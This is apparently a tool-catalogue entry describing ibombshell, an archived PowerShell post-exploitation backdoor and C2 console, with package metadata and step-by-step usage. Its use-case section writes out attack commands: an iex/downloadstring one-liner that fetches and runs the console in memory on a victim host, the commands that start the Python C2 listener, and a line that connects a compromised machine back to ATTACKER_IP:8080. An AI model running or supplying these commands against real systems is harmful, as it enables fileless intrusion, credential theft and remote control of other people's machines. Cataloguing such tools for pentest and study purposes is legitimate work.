---
name: "ibombshell"
categories:
  - backdoor
version: "0~git20201107-0parrot2"
homepage: "https://github.com/Telefonica/ibombshell"
origin: "parrot"
recipe: "parrot-repo"
packaged-by: [parrot]
build-system: python
meta-checked: "2026-11-09"
github-repo: "Telefonica/ibombshell"
github-stars: 319
github-pushed: "2021-05-28"
github-archived: true
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-07"
worth: 0.6
worth-basis: "historical (archived/gone upstream)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# ibombshell

> PowerShell post-exploitation console from Telefónica that loads entirely into memory and can be driven either interactively or as a C2-connected "warrior".

## What it's for

ibombshell (Telefónica's Ideas Locas team, archived upstream since 2021 — treat it as a historical/PoC tool, no QA and no maintenance) downloads a PowerShell console straight into memory on a compromised Windows host, so nothing touches disk. Its two documented modes are "everywhere" — an interactive prompt whose pentesting functions (privilege escalation, credential gathering, DLL generation, AMSI bypasses of their era) are likewise downloaded into memory on demand — and "silently", where the loaded instance (a "warrior") connects back over http to a Python C2 panel that pushes functions and instructions and receives results. It requires PowerShell 3.0 or higher on the target. Expect its 2020-era modules and bypasses to be detected by modern AV/AMSI; its value today is studying how memory-only PowerShell C2s were built.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Load the console into memory (everywhere mode)

Pull and execute the ibombshell console in the victim's PowerShell without writing files to disk.

```
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Telefonica/ibombshell/master/console')
```

Outcome: the console definition is downloaded and invoked in the current PowerShell session; nothing is persisted to disk, and the next command becomes available.

### Start the interactive console

Run the loaded console to get the ibombshell prompt with its post-exploitation menu.

```
console
```

Outcome: the session enters the ibombshell console, from which its memory-loaded functions can be listed and invoked; use `savefunctions` beforehand to stash loaded functions in the registry for offline/isolated environments.

### Stand up the C2 listener for silently mode

On the operator side, start the Python panel and create the http listener warriors connect back to.

```
python3 ibombshell.py
```

Then inside the panel:

```
load modules/listener.py
run
```

Outcome: the ibombshell C2 starts and the listener module binds (default port 8080), ready to register incoming warriors and push functions/instructions to them.

### Connect a warrior to the C2 (silently mode)

On the compromised host (after loading the console as above), attach the instance to your panel.

```
console -Silently -uriConsole http://ATTACKER_IP:8080
```

Outcome: the warrior registers with the C2 over http; from the panel you can enumerate connected warriors, load functions into their memory remotely, and receive execution results.
